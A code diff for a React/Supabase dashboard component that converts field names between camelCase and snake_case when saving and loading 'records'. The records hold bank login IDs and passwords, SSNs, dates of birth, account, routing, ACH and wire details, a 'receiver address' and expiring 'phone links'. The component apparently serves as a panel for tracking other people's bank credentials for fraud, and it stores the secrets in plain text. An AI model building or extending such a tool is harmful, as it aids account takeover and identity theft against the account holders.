@@ -18,13 +18,34 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
     const { data, error } = await supabase
       .from('records')
       .select('*, transactions(*)')
-      .order('createdAt', { ascending: false });
+      .order('created_at', { ascending: false });
 
     if (error) {
       console.error('Error fetching records:', error);
       return;
     }
-    setRecords(data as BankRecord[]);
+    
+    // Map snake_case back to camelCase for the frontend
+    const formattedData = data?.map(record => ({
+      ...record,
+      bankType: record.bank_type,
+      emailId: record.email_id,
+      firstName: record.first_name,
+      lastName: record.last_name,
+      accountNo: record.account_no,
+      loginId: record.login_id,
+      receiverAddress: record.receiver_address,
+      phoneLink: record.phone_link,
+      phoneExpiry: record.phone_expiry,
+      createdAt: record.created_at,
+      isDeleted: record.is_deleted,
+      transactions: record.transactions?.map((tx: any) => ({
+        ...tx,
+        recordId: tx.record_id
+      }))
+    }));
+    
+    setRecords(formattedData as BankRecord[]);
   };
 
   useEffect(() => {
@@ -34,16 +55,32 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
   const handleSave = async (record: BankRecord) => {
     const { transactions, ...recordData } = record as any;
 
-    // Clean up undefined values for Supabase
-    Object.keys(recordData).forEach(key => {
-      if (recordData[key] === undefined) {
-        recordData[key] = null;
-      }
-    });
+    // Convert camelCase to snake_case for Supabase
+    const supabaseData: any = {
+      id: recordData.id,
+      bank_type: recordData.bankType,
+      email_id: recordData.emailId,
+      first_name: recordData.firstName,
+      last_name: recordData.lastName,
+      account_no: recordData.accountNo,
+      routing: recordData.routing || null,
+      dob: recordData.dob || null,
+      ssn: recordData.ssn || null,
+      ach: recordData.ach || null,
+      wire: recordData.wire || null,
+      login_id: recordData.loginId || null,
+      password: recordData.password || null,
+      receiver_address: recordData.receiverAddress || null,
+      phone: recordData.phone || null,
+      phone_link: recordData.phoneLink || null,
+      phone_expiry: recordData.phoneExpiry || null,
+      created_at: recordData.createdAt,
+      is_deleted: recordData.isDeleted ? true : false
+    };
 
     const { error: recordError } = await supabase
       .from('records')
-      .upsert(recordData);
+      .upsert(supabaseData);
 
     if (recordError) {
       console.error('Error saving record:', recordError);
@@ -52,11 +89,13 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
     }
 
     if (record.bankType === 'Wells Fargo' && transactions) {
-      await supabase.from('transactions').delete().eq('recordId', record.id);
+      await supabase.from('transactions').delete().eq('record_id', record.id);
       if (transactions.length > 0) {
         const txsToInsert = transactions.map((tx: any) => ({
-          ...tx,
-          recordId: record.id
+          id: tx.id,
+          record_id: record.id,
+          amount: tx.amount,
+          date: tx.date
         }));
         await supabase.from('transactions').insert(txsToInsert);
       }
@@ -68,12 +107,12 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
   };
 
   const handleDelete = async (id: string) => {
-    await supabase.from('records').update({ isDeleted: true }).eq('id', id);
+    await supabase.from('records').update({ is_deleted: true }).eq('id', id);
     await fetchRecords();
   };
 
   const handleRestore = async (id: string) => {
-    await supabase.from('records').update({ isDeleted: false }).eq('id', id);
+    await supabase.from('records').update({ is_deleted: false }).eq('id', id);
     await fetchRecords();
   };
 
